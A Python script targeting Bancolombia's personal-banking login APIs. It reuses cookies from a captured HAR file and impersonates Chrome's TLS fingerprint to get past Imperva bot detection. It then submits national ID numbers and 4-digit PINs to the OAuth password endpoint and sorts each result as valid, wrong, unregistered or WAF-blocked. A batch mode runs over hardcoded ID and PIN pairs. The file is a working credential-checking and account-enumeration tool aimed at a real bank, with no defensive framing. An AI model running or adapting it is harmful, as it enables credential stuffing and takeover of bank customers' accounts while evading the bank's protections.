"""HAR replay + curl_cffi (TLS Chrome real).

Combina las cookies del HAR con TLS impersonation de Chrome 131 para que
Imperva nos vea como la misma sesion legitima que genero el HAR.

Uso:
    python -m src.bancolombia_har_curl --har harprueba.har 80009246 1379
    python -m src.bancolombia_har_curl --har harprueba.har --batch
"""
from __future__ import annotations

import argparse
import json
import logging
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from curl_cffi import AsyncSession

log = logging.getLogger("bancolombia_har_curl")
ROOT = Path(__file__).resolve().parent.parent

BASE = "https://svpersonas.apps.bancolombia.com"
CANAL = "https://canalpersonas-ext.apps.bancolombia.com"
WARMUP_URL = f"{BASE}/crear-usuario/ingresa-tus-datos"
PUBKEY_URL = f"{BASE}/projects/config/security/public-key"
CANAL_WARMUP_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-svp-ch-ms-configuration/parameters"
OAUTH_URL = f"{CANAL}/super-svp/api/v1/security-filters/authorization-services/authentication/id/oauth2/token"
IDENTITY_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-ch-ms-alias-identity/identity"

CLIENT_ID = "tCOVIxsPfSbbAa+OFH1IbgWcD6HkqXWyXi6x9pj4ZXM="
DOC_TYPE_CC = "TIPDOC_FS001"


def extract_cookies_from_har(har_path: Path) -> dict[str, dict[str, str]]:
    har = json.loads(har_path.read_text(encoding="utf-8"))
    by_domain: dict[str, dict[str, str]] = {}
    for entry in har["log"]["entries"]:
        host = urlparse(entry["request"]["url"]).hostname or ""
        for c in entry["request"].get("cookies") or []:
            name = c.get("name")
            val = c.get("value")
            if name and val is not None:
                by_domain.setdefault(host, {})[name] = val
        for h in entry["response"].get("headers", []):
            if h["name"].lower() != "set-cookie":
                continue
            head = h["value"].split(";", 1)[0]
            if "=" not in head:
                continue
            name, val = head.split("=", 1)
            by_domain.setdefault(host, {})[name.strip()] = val.strip()
    return by_domain


def _pubkey(n_hex, e_hex):
    return rsa.RSAPublicNumbers(e=int(e_hex, 16), n=int(n_hex, 16)).public_key()


def _enc(pubkey, clave):
    ct = pubkey.encrypt(
        clave.encode(),
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
    )
    return ct.hex().upper()


def _ts():
    n = datetime.now(timezone.utc).astimezone()
    return f"{n:%Y-%m-%d %H:%M:%S}:{n.microsecond//1000:03d}"


async def classify(cedula: str, clave: str, cookies_by_domain: dict[str, dict[str, str]]) -> dict[str, Any]:
    t0 = time.time()
    device_id = uuid.uuid4().hex
    sess = str(uuid.uuid4())

    # TLS de Chrome 131 (impersonate). Bypasses JA3/JA4 fingerprinting.
    async with AsyncSession(impersonate="chrome131") as s:
        # Cargar cookies del HAR en el cookie jar
        for host, ck in cookies_by_domain.items():
            for cname, cval in ck.items():
                s.cookies.set(cname, cval, domain=host, path="/")
                if host.endswith(".apps.bancolombia.com"):
                    s.cookies.set(cname, cval, domain=".apps.bancolombia.com", path="/")

        # 1) pubkey con cookies
        r = await s.get(PUBKEY_URL, headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": WARMUP_URL,
        })
        log.info("pubkey: %s  cookies_jar=%d", r.status_code, len(s.cookies.jar))
        if r.status_code != 200:
            return {
                "bucket": "BLOQUEADO_WAF",
                "step": "pubkey",
                "status": r.status_code,
                "body": r.text[:300],
                "duration": time.time() - t0,
            }
        pk = r.json()
        pubkey = _pubkey(pk["n"], pk["e"])
        pwd = _enc(pubkey, clave)

        # 2) oauth POST
        h = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": BASE,
            "Referer": f"{BASE}/",
            "app-version": "3.8.3",
            "channel": "SVP",
            "device-id": device_id,
            "device-info": json.dumps(
                {"device": "Windows", "os": "Android", "browser": "Chrome-148", "major": "148"},
                separators=(",", ":")
            ),
            "message-id": str(uuid.uuid4()),
            "platform-type": "web",
            "request-timestamp": _ts(),
            "session-tracker": sess,
        }
        body = {
            "grant_type": "password",
            "client_id": CLIENT_ID,
            "scope": "DOC",
            "password": pwd,
            "document_type": DOC_TYPE_CC,
            "document_number": cedula,
        }
        r = await s.post(OAUTH_URL, data=body, headers=h)
        log.info("oauth: %s", r.status_code)
        if r.status_code != 200:
            ct = r.headers.get("content-type", "")
            is_waf = "html" in ct or "imperva" in r.text.lower() or "access denied" in r.text.lower()
            return {
                "bucket": "BLOQUEADO_WAF" if is_waf else "DATOS_INCORRECTOS",
                "step": "oauth",
                "status": r.status_code,
                "body": r.text[:400],
                "duration": time.time() - t0,
            }
        ob = r.json()
        access = ob.get("data", {}).get("accessToken")
        if not access:
            return {"bucket": "DATOS_INCORRECTOS", "step": "oauth_no_token",
                    "body": r.text[:300], "duration": time.time() - t0}

        # 3) identity
        h2 = dict(h)
        h2["Content-Type"] = "application/json"
        h2["Authorization"] = f"Bearer {access}"
        h2["message-id"] = str(uuid.uuid4())
        h2["request-timestamp"] = _ts()
        r = await s.post(IDENTITY_URL, json={"documentType": DOC_TYPE_CC, "document": cedula}, headers=h2)
        log.info("identity: %s", r.status_code)
        idb = r.json() if r.status_code == 200 else {"raw": r.text[:300]}
        state = (idb.get("data") or {}).get("stateRegistry")
        bucket = "OK" if state == "Registered" else "SIN_USUARIO" if state else "DESCONOCIDO"
        return {
            "bucket": bucket,
            "stateRegistry": state,
            "oauth_status": 200,
            "identity_status": r.status_code,
            "duration": time.time() - t0,
        }


async def _main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-7s %(name)s :: %(message)s")
    ap = argparse.ArgumentParser()
    ap.add_argument("cedula", nargs="?")
    ap.add_argument("clave", nargs="?")
    ap.add_argument("--har", default="harprueba.har")
    ap.add_argument("--batch", action="store_true")
    args = ap.parse_args()

    har_path = Path(args.har)
    if not har_path.is_absolute():
        har_path = ROOT / har_path
    if not har_path.exists():
        print(f"ERROR: no encontre {har_path}")
        return
    cookies = extract_cookies_from_har(har_path)
    print(f"Cookies de {har_path.name}: dominios={list(cookies.keys())}")
    total = sum(len(v) for v in cookies.values())
    print(f"Total cookies: {total}")
    print()

    casos = [(args.cedula, args.clave)] if not args.batch else [
        ("79612743", "0000"),
        ("1030648205", "2872"),
        ("80009246", "1379"),
    ]
    for c, k in casos:
        if not c or not k:
            continue
        print(f">>> {c} / {k}")
        r = await classify(c, k, cookies)
        for kk, vv in r.items():
            print(f"  {kk:18}= {str(vv)[:250]}")
        print()


def main():
    import asyncio
    asyncio.run(_main())


if __name__ == "__main__":
    main()
